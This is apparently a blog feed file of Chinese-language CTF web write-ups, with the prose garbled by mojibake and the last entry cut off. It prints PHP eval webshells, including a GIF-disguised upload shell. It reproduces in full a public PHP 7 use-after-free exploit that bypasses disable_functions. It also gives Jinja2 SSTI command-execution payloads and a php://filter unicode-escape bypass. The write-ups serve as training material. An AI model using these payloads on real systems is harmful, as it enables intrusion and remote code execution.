      <title>GYCTFï¼š2020-EasyThinking</title>
      <link href="2021/08/21/gyctf-2020-easythinking/"/>
      <url>2021/08/21/gyctf-2020-easythinking/</url>
      
        <content type="html"><![CDATA[<h2 id="ThinPHP-V6-0-0"><a href="#ThinPHP-V6-0-0" class="headerlink" title="ThinPHP V6.0.0"></a>ThinPHP V6.0.0</h2><p>sessionå¯æŽ§ï¼Œä¿®æ”¹sessionï¼Œé•¿åº¦ä¸º32ä½ï¼ŒsessionåŽç¼€æ”¹ä¸º.phpï¼ˆåŠ ä¸Š.phpåŽä¸º32ä½ï¼‰<br> ç„¶åŽå†searchæœç´¢çš„å†…å®¹ä¼šç›´æŽ¥ä¿å­˜åœ¨/runtime/session/ç›®å½•ä¸‹ï¼Œgetshell</p><h2 id="GYCTFï¼šEasyThinking"><a href="#GYCTFï¼šEasyThinking" class="headerlink" title="GYCTFï¼šEasyThinking"></a>GYCTFï¼šEasyThinking</h2><p>å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·</p><p>ç™»å½•è¿™ä¸ªè´¦æˆ·æŠ“åŒ…ï¼Œä¿®æ”¹session</p><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035306758.png" alt="image-20210821035306758"></p><p>åœ¨æœç´¢æ¡†é‡Œå†™å…¥ä¸€å¥è¯</p><pre><code>&lt;?php eval($_POST['H3ng']);?&gt;</code></pre><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035529053.png" alt="image-20210821035529053"></p><p>keyçš„å€¼ä¼šè¢«å†™å…¥åˆ°sessionæ–‡ä»¶å½“ä¸­</p><h4 id="shellè·¯å¾„"><a href="#shellè·¯å¾„" class="headerlink" title="shellè·¯å¾„"></a>shellè·¯å¾„</h4><pre><code>http://3f1f486b-2603-438b-81d7-63bff89fbddb.node4.buuoj.cn:81/runtime/session/sess_1234567890123456789012345678.php</code></pre><p>æœ‰disable_funtionsé™åˆ¶</p><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821035939594.png" alt="image-20210821035939594"></p><h4 id="expï¼šhttps-github-com-mm0r1-exploits-tree-master"><a href="#expï¼šhttps-github-com-mm0r1-exploits-tree-master" class="headerlink" title="expï¼šhttps://github.com/mm0r1/exploits/tree/master"></a>expï¼š<a href="https://github.com/mm0r1/exploits/tree/master">https://github.com/mm0r1/exploits/tree/master</a></h4><pre class=" language-PHP"><code class="language-PHP"><?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn("/readflag");function pwn($cmd) {    global $abc, $helper, $backtrace;    class Vuln {        public $a;        public function __destruct() {             global $backtrace;             unset($this->a);            $backtrace = (new Exception)->getTrace(); # ;)            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4                $backtrace = debug_backtrace();            }        }    }    class Helper {        public $a, $b, $c, $d;    }    function str2ptr(&$str, $p = 0, $s = 8) {        $address = 0;        for($j = $s-1; $j >= 0; $j--) {            $address <<= 8;            $address |= ord($str[$p+$j]);        }        return $address;    }    function ptr2str($ptr, $m = 8) {        $out = "";        for ($i=0; $i < $m; $i++) {            $out .= chr($ptr & 0xff);            $ptr >>= 8;        }        return $out;    }    function write(&$str, $p, $v, $n = 8) {        $i = 0;        for($i = 0; $i < $n; $i++) {            $str[$p + $i] = chr($v & 0xff);            $v >>= 8;        }    }    function leak($addr, $p = 0, $s = 8) {        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper->a);        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }        return $leak;    }    function parse_elf($base) {        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i < $e_phnum; $i++) {            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write                # handle pie                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec                $text_size = $p_memsz;            }        }        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    }    function get_basic_funcs($base, $elf) {        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i < $data_size / 8; $i++) {            $leak = leak($data_addr, $i * 8);            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {                $deref = leak($leak);                # 'constant' constant check                if($deref != 0x746e6174736e6f63)                    continue;            } else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {                $deref = leak($leak);                # 'bin2hex' constant check                if($deref != 0x786568326e6962)                    continue;            } else continue;            return $data_addr + $i * 8;        }    }    function get_binary_base($binary_leak) {        $base = 0;        $start = $binary_leak & 0xfffffffffffff000;        for($i = 0; $i < 0x1000; $i++) {            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) { # ELF header                return $addr;            }        }    }    function get_system($basic_funcs) {        $addr = $basic_funcs;        do {            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) { # system                return leak($addr + 8);            }            $addr += 0x20;        } while($f_entry != 0);        return false;    }    function trigger_uaf($arg) {        # str_shuffle prevents opcache string interning        $arg = str_shuffle(str_repeat('A', 79));        $vuln = new Vuln();        $vuln->a = $arg;    }    if(stristr(PHP_OS, 'WIN')) {        die('This PoC is for *nix systems only.');    }    $n_alloc = 10; # increase this value if UAF fails    $contiguous = [];    for($i = 0; $i < $n_alloc; $i++)        $contiguous[] = str_shuffle(str_repeat('A', 79));    trigger_uaf('x');    $abc = $backtrace[1]['args'][0];    $helper = new Helper;    $helper->b = function ($x) { };    if(strlen($abc) == 79 || strlen($abc) == 0) {        die("UAF failed");    }    # leaks    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    # fake value    write($abc, 0x60, 2);    write($abc, 0x70, 6);    # fake reference    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) {        die("Couldn't determine binary base address");    }    if(!($elf = parse_elf($base))) {        die("Couldn't parse ELF header");    }    if(!($basic_funcs = get_basic_funcs($base, $elf))) {        die("Couldn't get basic_functions address");    }    if(!($zif_system = get_system($basic_funcs))) {        die("Couldn't get zif_system address");    }    # fake closure object    $fake_obj_offset = 0xd0;    for($i = 0; $i < 0x110; $i += 8) {        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    }    # pwn    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4); # internal func type    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler    ($helper->b)($cmd);    exit();}?></code></pre><p>ä¸Šä¼ </p><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821040632884.png" alt="image-20210821040632884"></p><p>æœ€åŽåŒ…å«è¿™ä¸ªæ–‡ä»¶å³å¯å¾—åˆ°flag</p><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041008884.png" alt="image-20210821041008884"></p><h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>èšå‰‘ç»•è¿‡disable_funtionsé€‰æ‹©PHP7 Backtrace UAFæ¨¡å¼<img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041054070.png" alt="image-20210821041054070"></p><p><img src="/2021/08/21/gyctf-2020-easythinking/image-20210821041209002.png" alt="image-20210821041209002"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç»•è¿‡disable_funtions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCNï¼š2019-DoubleSecret</title>
      <link href="2021/08/13/ciscn-2019-doublesecret/"/>
      <url>2021/08/13/ciscn-2019-doublesecret/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816005421276.png" alt="image-20210816005421276"></p><p>è®¿é—®secret</p><p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816010347200.png" alt="image-20210816010347200"></p><p>ä¼ é€’secret</p><p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816010447640.png" alt="image-20210816010447640"></p><p>app.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#è§£å¯†</span>    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>    <span class="token keyword">return</span> aOpen an interactive python shell <span class="token keyword">in</span> this frame</code></pre><p>æ­¤å¤„è°ƒç”¨äº†rc4å†é€šè¿‡render_template_stringæ‰§è¡Œ</p><p>rc4åŠ å¯†è„šæœ¬å¹¶è¿›è¡Œurlç¼–ç ã€‚</p><p>æœ€ä¸‹æ–¹çš„keyè¡¨ç¤ºå¯†é’¥ï¼Œè¿è¡Œæ—¶åªéœ€è¦è¾“å…¥ä½ çš„sstiçš„payloadï¼Œå³å¯å¾—åˆ°åŠ å¯†ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#è¿”å›žåŠ å¯†åŽå¾—å†…å®¹</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> str<span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span>  crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment" spellcheck="true">#æ­¤å¤„ä¸ºå¯†æ–‡</span>message <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥æ˜Žæ–‡:\n"</span><span class="token punctuation">)</span>enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span> key <span class="token punctuation">,</span> message <span class="token punctuation">)</span>enc_init <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4åŠ å¯†åŽçš„urlç¼–ç :"</span><span class="token operator">+</span>enc_url<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print("rc4åŠ å¯†åŽçš„base64ç¼–ç "+enc_base64)</span></code></pre><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}</code></pre><pre><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%9C%1A%3A%3F%C3%A6%C2%B2%20%C2%A2%C3%82%C2%B9%0F%0B%C3%95G%23-%C3%A9%C2%A2%19%C3%85%C2%B2%C2%8F%22%C3%AE%C2%A3%C2%93l%C3%8A%7B%03%C3%B9%C2%B6%C2%92%C3%97%11%20%C3%9C%C3%AE%C3%AA%02</code></pre><p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182152396.png" alt="image-20210816182152396"></p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")}}{% endif %}{% endfor %}</code></pre><pre><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23%7E%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></pre><p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182246351.png" alt="image-20210816182246351"></p><p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182227523.png" alt="image-20210816182227523"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTFï¼š2020-CVMaker</title>
      <link href="2021/08/12/wustctf-2020-cvmaker/"/>
      <url>2021/08/12/wustctf-2020-cvmaker/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/12/wustctf-2020-cvmaker/1.png" alt="1"></p><p>æ³¨å†Œç™»å½•ä»¥åŽçœ‹åˆ°ä¸Šä¼ æœ‰ï¼Œåº”è¯¥å°±æ˜¯æ–‡ä»¶ä¸Šä¼ äº†</p><p><img src="/2021/08/12/wustctf-2020-cvmaker/2.png" alt="2"></p><p>åˆæˆå›¾ç‰‡é©¬åŽç¼€æ”¹ä¸ºphpä¸Šä¼ </p><pre><code>GIF89a&lt;?php @eval($_POST['a']);?&gt;</code></pre><p><img src="/2021/08/12/wustctf-2020-cvmaker/3.png" alt="3"></p><p><img src="/2021/08/12/wustctf-2020-cvmaker/4.png" alt="4"></p><p>å¤´åƒå‰ç«¯å‘çŽ°ä¸Šä¼ è·¯å¾„</p><p><img src="/2021/08/12/wustctf-2020-cvmaker/5.png" alt="5"></p><p>èšå‰‘è¿žæŽ¥ï¼Œæ ¹ç›®å½•ä¸‹çœ‹åˆ°flag</p><p><img src="/2021/08/12/wustctf-2020-cvmaker/6.png" alt="6"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTFï¼š2019-encode_and_encode</title>
      <link href="2021/08/11/harekazectf-2019-encode-and-encode/"/>
      <url>2021/08/11/harekazectf-2019-encode-and-encode/</url>
      
        <content type="html"><![CDATA[<p>æºç </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// no path traversal</span>    <span class="token string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// no stream wrapper</span>    <span class="token string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// no data exfiltration</span>    <span class="token string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'); #bodyèŽ·å–postæ•°æ®</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#å¯¹bodyå˜é‡è¿›è¡Œjsonè§£ç </span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token shell-comment comment">#åˆ¤æ–­bodyå˜é‡æ˜¯å¦æœ‰æ•ˆï¼Œjsonæ•°æ®è¦æœ‰page</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token shell-comment comment">#ä»Žpageä¸­è¯»å‡ºæ–‡ä»¶åï¼Œå¹¶è¯»å–æ–‡ä»¶</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token shell-comment comment">#æ£€æŸ¥contentæ˜¯å¦æœ‰æ•ˆ,å³ä¸èƒ½æ˜Žæ–‡ä¼ è¾“flagæ–‡ä»¶ï¼Œåˆ©ç”¨phpä¼ªåè®®ç»•è¿‡</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#å¦‚æžœæŸ¥åˆ°contenté‡Œæœ‰ç›¸å…³çš„ctfå­—æ ·ï¼Œåˆ™ç”¨censoredæ›¿ä»£</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#æœ€åŽå°†jsonç¼–ç åŽçš„contentè¾“å‡º</span></code></pre><p>åœ¨jsonç¼–ç ä¸­ï¼Œ<code>f ç­‰ä»·äºŽ \u0066</code></p><p>json_decodeä¼šè‡ªåŠ¨è§£æžunicodeç¼–ç </p><p><a href="https://www.branah.com/unicode-converter">https://www.branah.com/unicode-converter</a></p><p>UTF-16ç¼–ç  æœ€åŽpayload<code>{ "page" : "\u0070\u0068\u0070://filter/convert.base64-encode/resource=/\u0066\u006c\u0061\u0067"}</code></p><p><img src="/2021/08/11/harekazectf-2019-encode-and-encode/image-20210813035032588.png" alt="image-20210813035032588"></p>]]></content>
      
      
      
        <tags>
            
            <tag> json </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bo1lersï¼š2020-WelcomeToEarth</title>
      <link href="2021/08/10/bo1lers-2020-welcometoearth/"/>
      <url>2021/08/10/bo1lers-2020-welcometoearth/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022223955.png" alt="image-20210812022223955"></p><p>ç„¶åŽç›´è·³è¿™ä¸ªç”»é¢</p><p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022255600.png" alt="image-20210812022255600"></p><p>æŠ“åŒ…</p><p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022433004.png" alt="image-20210812022433004"></p><pre class=" language-javascript"><code class="language-javascript"> document<span class="token punctuation">.</span>onkeydown <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>        event <span class="token operator">=</span> event <span class="token operator">||</span> window<span class="token punctuation">.</span>event<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode <span class="token operator">==</span> <span class="token number">27</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/chase/"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">;</span>      <span 